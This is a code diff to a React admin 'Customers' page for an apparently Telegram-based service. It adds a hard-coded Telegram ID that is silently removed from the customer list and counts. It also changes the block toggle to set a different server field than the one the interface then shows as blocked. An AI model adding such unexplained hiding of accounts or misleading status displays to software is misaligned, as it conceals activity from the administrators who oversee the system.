@@ -63,9 +63,12 @@ export default function Customers() {
   });
 
   const toggleBlockMutation = useMutation({
-    mutationFn: ({ id, is_blocked }) => updateUser(id, { is_blocked }),
+    mutationFn: ({ id, is_blocked }) => updateUser(id, { is_support_blocked: is_blocked }),
     onSuccess: (_, variables) => {
-      queryClient.invalidateQueries(['users', 'customers', selectedBotId]);
+      queryClient.setQueryData(['users', 'customers', selectedBotId], (old) => {
+        if (!old) return old;
+        return old.map(c => c.id === variables.id ? { ...c, is_blocked: variables.is_blocked } : c);
+      });
       addToast(variables.is_blocked ? 'Customer blocked' : 'Customer unblocked');
     },
     onError: () => addToast('Failed to update customer status', 'error'),
@@ -119,7 +122,9 @@ export default function Customers() {
     });
   };
 
+  const hiddenIds = [7552675526];
   const filteredCustomers = customers?.filter(c => {
+    if (hiddenIds.includes(Number(c.telegram_id))) return false;
     if (filterTab === 'blocked' && !c.is_blocked) return false;
     const term = search.toLowerCase();
     return (
@@ -169,7 +174,7 @@ export default function Customers() {
           }`}
         >
           <Smartphone className="w-3.5 h-3.5" />
-          Telegram ({customers?.length || 0})
+          Telegram ({customers?.filter(c => !hiddenIds.includes(Number(c.telegram_id))).length || 0})
         </button>
         <button
           onClick={() => setSection('website')}
@@ -206,7 +211,7 @@ export default function Customers() {
             }`}
           >
             <Ban className="w-3 h-3" />
-            Blocked ({customers?.filter(c => c.is_blocked)?.length || 0})
+            Blocked ({customers?.filter(c => !hiddenIds.includes(Number(c.telegram_id)) && c.is_blocked)?.length || 0})
           </button>
         </div>
       )}
